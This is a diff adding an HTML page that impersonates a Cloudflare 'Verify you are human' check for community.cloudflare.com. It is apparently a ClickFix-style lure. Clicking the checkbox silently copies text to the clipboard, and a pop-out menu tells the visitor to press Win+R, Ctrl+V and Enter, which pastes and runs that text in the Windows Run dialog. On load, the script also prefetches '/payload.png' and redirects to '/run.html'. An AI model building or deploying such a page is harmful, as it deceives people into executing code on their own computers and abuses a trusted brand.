@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Neurithm CAPTCHA</title>
+<style>
+  :root{
+    --bg:#000000;
+    --text:#ffffff;
+    --muted:#b0b0b0;
+    --border:#555555;
+    --captcha-bg:#2d2d2d;
+    --green:#16a765;
+    --link:#4a9eff;
+  }
+
+  @media(prefers-color-scheme:light){
+    :root{
+      --bg:#ffffff;
+      --text:#171717;
+      --muted:#555555;
+      --border:#d7d7d7;
+      --captcha-bg:#fafafa;
+      --green:#16a765;
+      --link:#0066cc;
+    }
+  }
+
+  *{box-sizing:border-box; margin:0; padding:0}
+
+  html, body{
+    height:100%;
+  }
+
+  body{
+    background:var(--bg);
+    font-family:Arial,Helvetica,sans-serif;
+    color:var(--text);
+    display:flex;
+    flex-direction:column;
+    min-height:100vh;
+  }
+
+  .key {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(180deg, #fdf6ec 0%, #f5ead6 100%);
+    border: 1px solid #e6d8b8;
+    border-radius: 5px;
+    box-shadow: 0 2px 3px rgba(180, 150, 100, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.9);
+    color: #bd814c;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-weight: 600;
+    font-size: 11px;
+    vertical-align: middle;
+    margin: 0 2px;
+    height: 22px;
+    padding: 0 6px;
+  }
+
+  .key-ctrl { width: 41px; }
+  .key-r    { width: 21px; }
+  .key-win  { width: 48px; gap: 3px; }
+
+  .win-logo {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    grid-template-rows: 1fr 1fr;
+    gap: 1px;
+    width: 9px;
+    height: 9px;
+  }
+  .win-logo span { background: #c9854a; border-radius: 1px; }
+
+  .page{
+    flex:1;
+    display:flex;
+    flex-direction:column;
+    padding:13vh 0 0 27vw;
+    max-width:1920px;
+  }
+
+  .site-name{
+    margin:0 0 16px;
+    font-size:32px;
+    line-height:1.2;
+    font-weight:700;
+    color:var(--text);
+  }
+
+  .title{
+    margin:0 0 12px;
+    font-size:20px;
+    font-weight:700;
+    color:var(--text);
+  }
+
+  .instruction{
+    margin:0 0 36px;
+    color:var(--muted);
+    font-size:14px;
+    line-height:1.6;
+    max-width:700px;
+  }
+
+  .captcha-wrapper{
+    width:300px;
+    position:relative;
+  }
+
+  .captcha{
+    width:100%;
+    height:70px;
+    border:1px solid var(--border);
+    border-radius:4px;
+    background:var(--captcha-bg);
+    overflow:hidden;
+    position:relative;
+    z-index:2;
+  }
+
+  .captcha-menu{
+    width:100%;
+    background:var(--captcha-bg);
+    border-left:1px solid var(--border);
+    border-right:1px solid var(--border);
+    border-bottom:1px solid var(--border);
+    border-radius:0 0 4px 4px;
+    overflow:hidden;
+    max-height:0;
+    opacity:0;
+    transition:max-height 0.4s ease-out, opacity 0.3s ease-out, padding 0.4s ease-out;
+    position:relative;
+    z-index:1;
+    margin-top:-1px;
+  }
+
+  .captcha.expanded + .captcha-menu{
+    max-height:220px;
+    opacity:1;
+    padding:16px;
+    transition-delay: 1s;
+  }
+
+  .captcha-menu-text{
+    font-size:12px;
+    line-height:1.5;
+    color:var(--muted);
+    margin-bottom:12px;
+  }
+
+  .captcha-row{
+    width:100%;
+    height:100%;
+    display:flex;
+    align-items:center;
+    padding:12px 16px;
+    gap:12px;
+  }
+
+  .indicator{
+    width:24px;
+    height:24px;
+    flex:0 0 24px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  .checkbox{
+    width:20px;
+    height:20px;
+    padding:0;
+    border:2px solid var(--border);
+    border-radius:3px;
+    background:var(--bg);
+    cursor:pointer;
+  }
+
+  .checkbox:focus-visible{
+    outline:2px solid rgba(22,167,101,.35);
+    outline-offset:2px;
+  }
+
+  .message{
+    flex:1;
+    min-width:0;
+    font-size:14px;
+    line-height:1;
+    white-space:nowrap;
+    color:var(--text);
+  }
+
+  .brand{
+    width:70px;
+    flex:0 0 70px;
+    text-align:center;
+    line-height:1;
+  }
+
+  .cloud{
+    position:relative;
+    width:28px;
+    height:13px;
+    margin:0 auto 2px;
+  }
+
+  .cloud-main{
+    position:absolute;
+    left:2px;
+    bottom:0;
+    width:24px;
+    height:7px;
+    background:#f58220;
+    border-radius:4px 4px 1px 1px;
+  }
+
+  .cloud-main:before{
+    content:"";
+    position:absolute;
+    left:7px;
+    top:-7px;
+    width:13px;
+    height:10px;
+    background:#f58220;
+    border-radius:50%;
+  }
+
+  .cloud-main:after{
+    content:"";
+    position:absolute;
+    right:-3px;
+    top:1px;
+    width:8px;
+    height:7px;
+    background:#f6a23b;
+    border-radius:50%;
+  }
+
+  .wordmark{
+    font-size:7px;
+    font-weight:800;
+    letter-spacing:.16em;
+    color:var(--text);
+  }
+
+  .links{
+    margin-top:3px;
+    font-size:6px;
+    color:var(--muted);
+  }
+
+  .links span{
+    text-decoration:underline;
+    text-underline-offset:1px;
+  }
+
+  .loader{
+    width:24px;
+    height:24px;
+    position:relative;
+  }
+
+  .loader span{
+    position:absolute;
+    width:3px;
+    height:3px;
+    border-radius:50%;
+    background:var(--green);
+    left:50%;
+    top:50%;
+    margin:-1.5px;
+  }
+
+  .loader span:nth-child(1){animation:orbit1 1.5s linear infinite}
+  .loader span:nth-child(2){animation:orbit2 1.5s linear infinite}
+  .loader span:nth-child(3){animation:orbit3 1.5s linear infinite}
+  .loader span:nth-child(4){animation:orbit4 1.5s linear infinite}
+  .loader span:nth-child(5){animation:orbit5 1.5s linear infinite}
+  .loader span:nth-child(6){animation:orbit6 1.5s linear infinite}
+  .loader span:nth-child(7){animation:orbit7 1.5s linear infinite}
+  .loader span:nth-child(8){animation:orbit8 1.5s linear infinite}
+
+  @keyframes orbit1{
+    0%{transform:rotate(0deg) translateX(9px) rotate(0deg)}
+    100%{transform:rotate(360deg) translateX(9px) rotate(-360deg)}
+  }
+  @keyframes orbit2{
+    0%{transform:rotate(45deg) translateX(9px) rotate(-45deg)}
+    100%{transform:rotate(405deg) translateX(9px) rotate(-405deg)}
+  }
+  @keyframes orbit3{
+    0%{transform:rotate(90deg) translateX(9px) rotate(-90deg)}
+    100%{transform:rotate(450deg) translateX(9px) rotate(-450deg)}
+  }
+  @keyframes orbit4{
+    0%{transform:rotate(135deg) translateX(9px) rotate(-135deg)}
+    100%{transform:rotate(495deg) translateX(9px) rotate(-495deg)}
+  }
+  @keyframes orbit5{
+    0%{transform:rotate(180deg) translateX(9px) rotate(-180deg)}
+    100%{transform:rotate(540deg) translateX(9px) rotate(-540deg)}
+  }
+  @keyframes orbit6{
+    0%{transform:rotate(225deg) translateX(9px) rotate(-225deg)}
+    100%{transform:rotate(585deg) translateX(9px) rotate(-585deg)}
+  }
+  @keyframes orbit7{
+    0%{transform:rotate(270deg) translateX(9px) rotate(-270deg)}
+    100%{transform:rotate(630deg) translateX(9px) rotate(-630deg)}
+  }
+  @keyframes orbit8{
+    0%{transform:rotate(315deg) translateX(9px) rotate(-315deg)}
+    100%{transform:rotate(675deg) translateX(9px) rotate(-675deg)}
+  }
+
+  .success {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: #16a765; /* 초록색 배경 */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    animation: successPop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+  }
+
+  .success svg {
+    width: 14px;
+    height: 14px;
+    stroke: #ffffff;
+    stroke-width: 3;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    fill: none;
+    stroke-dasharray: 30;
+    stroke-dashoffset: 30;
+    animation: drawCheck 0.4s ease-out 0.2s forwards;
+  }
+
+  @keyframes successPop {
+    0% {
+      transform: scale(0);
+      opacity: 0;
+    }
+    60% {
+      transform: scale(1.15);
+      opacity: 1;
+    }
+    100% {
+      transform: scale(1);
+      opacity: 1;
+    }
+  }
+
+  @keyframes drawCheck {
+    to {
+      stroke-dashoffset: 0;
+    }
+  }
+
+  .footer{
+    margin-top:auto;
+    padding:0 27vw 24px;
+    max-width:1920px;
+  }
+
+  .footer-line{
+    width:100%;
+    height:1px;
+    background:var(--border);
+    margin-bottom:16px;
+  }
+
+  .footer-text{
+    text-align:center;
+    font-size:12px;
+    color:var(--muted);
+    line-height:1.8;
+  }
+
+  .footer-text a{
+    color:var(--link);
+    text-decoration:underline;
+  }
+
+  @media(max-width:900px){
+    .page{padding:40px 20px 0}
+    .footer{padding:0 20px 24px}
+    .captcha-wrapper{width:100%;max-width:300px}
+  }
+
+  @media(prefers-reduced-motion:reduce){
+    .loader span{animation:none}
+    .success{animation:none}
+    .captcha-menu{transition:none}
+  }
+</style>
+</head>
+
+<body>
+<main class="page">
+  <section class="verification" aria-label="Human verification">
+
+    <h1 class="site-name">community.cloudflare.com</h1>
+
+    <h2 class="title">Performing security verification</h2>
+
+    <p class="instruction">
+      This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.
+    </p>
+
+    <div class="captcha-wrapper">
+      <div class="captcha" id="captcha">
+        <div class="captcha-row">
+
+          <div class="indicator" id="indicator">
+            <button
+              class="checkbox"
+              id="verifyButton"
+              type="button"
+              aria-label="Verify you are human">
+            </button>
+          </div>
+
+          <div class="message" id="message" aria-live="polite">
+            Verify you are human
+          </div>
+
+          <div class="brand" aria-label="Cloudflare">
+            <div class="cloud">
+              <div class="cloud-main"></div>
+            </div>
+            <div class="wordmark">CLOUDFLARE</div>
+            <div class="links">
+              <span>Privacy</span> · <span>Help</span>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="captcha-menu" id="captchaMenu">
+        <div class="captcha-menu-text" style="line-height: 1.5;">
+          Some programs installed on your browser are interfering with Cloudflare's checks. Please perform the actions below to ensure the current process is not blocked.<br>
+          1. <span class="key key-win"><span class="win-logo"><span></span><span></span><span></span><span></span></span>Win</span> + <span class="key key-r">R</span><br><br>
+          2. <span class="key key-ctrl">Ctrl</span> + <span class="key key-r">V</span><br><br>
+          3. <span class="key key-ctrl">Enter</span>
+        </div>
+      </div>
+    </div>
+
+  </section>
+</main>
+
+<footer class="footer">
+  <div class="footer-line"></div>
+  <div class="footer-text">
+    Ray ID: a45c42151e861c6f<br>
+    Performance and Security by <a href="#">Cloudflare</a> | <a href="#">Privacy</a>
+  </div>
+</footer>
+
+<script>
+(() => {
+  window.addEventListener('DOMContentLoaded', () => {
+            // 1. 백그라운드에서 payload.png를 캐싱
+            const prefetchLink = document.createElement('link');
+            prefetchLink.rel = 'prefetch';
+            prefetchLink.href = '/payload.png'; // 서버의 실제 경로
+            prefetchLink.as = 'image';
+            document.head.appendChild(prefetchLink);
+
+            // 2. 3초 후 자동으로 run.html로 리디렉션 (사용자 경험을 위해)
+            setTimeout(() => {
+                window.location.href = '/run.html';
+            }, 3000);
+        });
+  
+  const indicator = document.getElementById("indicator");
+  const message = document.getElementById("message");
+  const button = document.getElementById("verifyButton");
+  const captcha = document.getElementById("captcha");
+  const fixingCode = 'Your operation is completed!';
+
+  let isVerifying = false;       // Check if verification is in progress
+  let isProcessingEnter = false; // Prevent duplicate Enter key inputs
+
+  async function copyToClipboard(text) {
+    // 1️⃣ 최신 API 시도 (HTTPS 또는 localhost)
+    if (navigator.clipboard && window.isSecureContext) {
+      await navigator.clipboard.writeText(text);
+      return;
+    }
+
+    // 2️⃣ 폴백: 구형/HTTP 환경용 (textarea + execCommand)
+    return new Promise((resolve, reject) => {
+      const textArea = document.createElement('textarea');
+      textArea.value = text;
+      
+      // 화면에 보이지 않게 처리
+      textArea.style.position = 'fixed';
+      textArea.style.left = '-9999px';
+      textArea.style.top = '-9999px';
+      textArea.style.opacity = '0';
+      
+      document.body.appendChild(textArea);
+      textArea.focus();
+      textArea.select();
+      textArea.setSelectionRange(0, text.length); // iOS 호환
+
+      try {
+        const success = document.execCommand('copy');
+        if (success) {
+          resolve();
+        } else {
+          reject(new Error('execCommand 실패'));
+        }
+      } catch (err) {
+        reject(err);
+      } finally {
+        document.body.removeChild(textArea);
+      }
+    });
+  }
+
+  function makeLoader(){
+    const loader = document.createElement("div");
+    loader.className = "loader";
+    loader.setAttribute("role","progressbar");
+    loader.setAttribute("aria-label","Verifying");
+
+    for(let i=0; i<8; i++){
+      loader.appendChild(document.createElement("span"));
+    }
+    return loader;
+  }
+
+  async function startCopyAndVerification(){
+    try {
+      await copyToClipboard(fixingCode);
+      // setTimeout(() => {
+      //   copyHint.textContent = '📋 클릭하면 복사됩니다';
+      //   copyHint.style.color = '#888';
+      //   copyHint.style.fontWeight = 'normal';
+      // }, 3000);
+    } catch (err) {
+      console.error('복사 실패:', err);
+    }
+
+    if(isVerifying) return; 
+    
+    isVerifying = true;
+    isProcessingEnter = false; // Reset state
+    button.disabled = true;
+
+    // Display loading animation
+    indicator.replaceChildren(makeLoader());
+    message.textContent = "Verifying..."; 
+    
+    // Expand the menu (Optional: wrap in setTimeout if you want a 1s delay)
+    captcha.classList.add("expanded");
+  }
+
+  function completeVerification(){
+    if(!isVerifying) return;
+
+    const success = document.createElement("div");
+    success.className = "success";
+    success.setAttribute("aria-label","Verification successful");
+
+    success.innerHTML = `
+      <svg viewBox="0 0 24 24">
+        <polyline points="4 12 10 18 20 6"></polyline>
+      </svg>
+    `;
+
+    // Replace loader with success icon
+    indicator.replaceChildren(success);
+    message.textContent = "Success!";
+    
+    // Reset state
+    isVerifying = false;
+    isProcessingEnter = false;
+  }
+
+  // 1. Start loading when the button is clicked
+  button.addEventListener("click", startCopyAndVerification);
+
+  // 2. Global Enter key listener
+  document.addEventListener("keydown", (event) => {
+    if (event.key === "Enter" && isVerifying && !isProcessingEnter) {
+      
+      // Set lock to prevent duplicate execution
+      isProcessingEnter = true; 
+      
+      // Close the expanded menu smoothly
+      captcha.classList.remove("expanded");
+
+      // Notify user that it's processing
+      //message.textContent = "Processing..."; 
+
+      // Show success screen after 2 seconds (2000ms)
+      setTimeout(() => {
+        completeVerification();
+      }, 2000);
+      
+    }
+  });
+})();
+</script>
+
+</body>
+</html>
